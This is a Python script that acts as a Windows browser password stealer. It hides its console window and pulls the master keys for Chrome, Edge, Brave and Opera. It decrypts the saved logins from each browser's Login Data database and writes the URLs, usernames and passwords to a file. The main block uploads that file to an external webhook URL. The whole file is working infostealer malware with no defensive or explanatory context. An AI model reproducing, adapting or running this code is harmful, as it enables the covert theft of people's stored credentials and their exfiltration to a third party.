import base64
import json
import os
import shutil
import sqlite3
import requests
import ctypes
import getpass
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData

# Hide console window
def hide_console():
    ctypes.windll.kernel32.SetConsoleTitleW("Hidden Console")
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

appdata = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')

# Browser data paths
browsers = {
    'chrome': appdata + '\\Google\\Chrome\\User Data',
    'msedge': appdata + '\\Microsoft\\Edge\\User Data',
    'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
    'opera': roaming + '\\Opera Software\\Opera Stable',
    'opera-gx': roaming + '\\Opera Software\\Opera GX Stable'
}

# SQL query to extract passwords and URLs
data_queries = {
    'login_data': {
        'query': 'SELECT action_url, username_value, password_value FROM logins',
        'file': '\\Login Data',
        'columns': ['URL', 'Username', 'Password'],
        'decrypt': True
    }
}

# Get master encryption key from browser
def get_master_key(path: str):
    if not os.path.exists(path):
        print(f"[!] Master key path not found: {path}")
        return
    try:
        with open(path + "\\Local State", "r", encoding="utf-8") as f:
            local_state = json.load(f)
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        key = CryptUnprotectData(key[5:], None, None, None, 0)[1]
        return key
    except Exception as e:
        print(f"[!] Failed to retrieve master key: {e}")
        return

# Decrypt encrypted password using AES
def decrypt_password(buff: bytes, key: bytes) -> str:
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        return decrypted_pass[:-16].decode('utf-8')
    except Exception:
        return ""

# Append browser data to a text file
def append_to_file(filename, content):
    if content:
        with open(filename, 'a', encoding="utf-8") as f:
            f.write(content)

# Query browser SQLite databases to extract password data
def get_passwords(path: str, profile: str, key):
    db_file = f'{path}\\{profile}{data_queries["login_data"]["file"]}'
    if not os.path.exists(db_file):
        print(f"[!] Login Data file not found: {db_file}")
        return ""
    
    result = ""
    try:
        shutil.copy(db_file, 'temp_db')
        conn = sqlite3.connect('temp_db')
        cursor = conn.cursor()
        cursor.execute(data_queries['login_data']['query'])
        
        for row in cursor.fetchall():
            url, username, encrypted_password = row
            password = decrypt_password(encrypted_password, key)
            result += f"URL: {url}\nUsername: {username}\nPassword: {password}\n\n"
        conn.close()
        os.remove('temp_db')
    except Exception as e:
        print(f"[!] Failed to retrieve passwords: {e}")
    
    return result

# Send the output file to the specified API endpoint
def send_output_file(api_url, file_path):
    boundary = "------------------------" + os.urandom(8).hex()
    filename = os.path.basename(file_path)
    with open(file_path, 'rb') as f:
        file_data = f.read()

    body = (
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"file\"; filename=\"{filename}\"\r\n"
        "Content-Type: application/octet-stream\r\n\r\n"
        f"{file_data.decode('latin1')}\r\n"
        f"--{boundary}--\r\n"
    )

    headers = {
        'Content-Type': f'multipart/form-data; boundary={boundary}'
    }
    
    response = requests.post(api_url, headers=headers, data=body.encode('latin1'))
    if response.status_code == 204:
        print("[*] File successfully sent.")
    else:
        print(f"[!] Failed to send file. Status code: {response.status_code}")

# Main execution
if __name__ == '__main__':
    hide_console()
    username = getpass.getuser()
    output_file = f'browserpass_{username}.txt'
    open(output_file, 'w').close()  # Clear or create the file initially

    available_browsers = [browser for browser in browsers if os.path.exists(browsers[browser] + "\\Local State")]
    if not available_browsers:
        print("[!] No available browsers found.")
    
    for browser in available_browsers:
        print(f"[*] Attempting to extract passwords from {browser}")
        browser_path = browsers[browser]
        master_key = get_master_key(browser_path)
        if not master_key:
            print(f"[!] No master key found for {browser}")
            continue

        # Extract passwords and save to file
        data = get_passwords(browser_path, "Default" if browser != 'opera-gx' else "", master_key)
        if data:
            append_to_file(output_file, f"--- {browser.capitalize()} Passwords ---\n{data}")
        else:
            print(f"[!] No passwords extracted for {browser}")

    # Append "---" at the end of the file
    append_to_file(output_file, "---\n")

    # Send the combined file to the specified API
    api_url = "https://hook.eu2.make.com/pgvj9kxtwo4pcrhxwn1kg9p9agp129bl"  # Replace with your actual API URL
    send_output_file(api_url, output_file)

    print(f"[*] Passwords extracted to {output_file}.")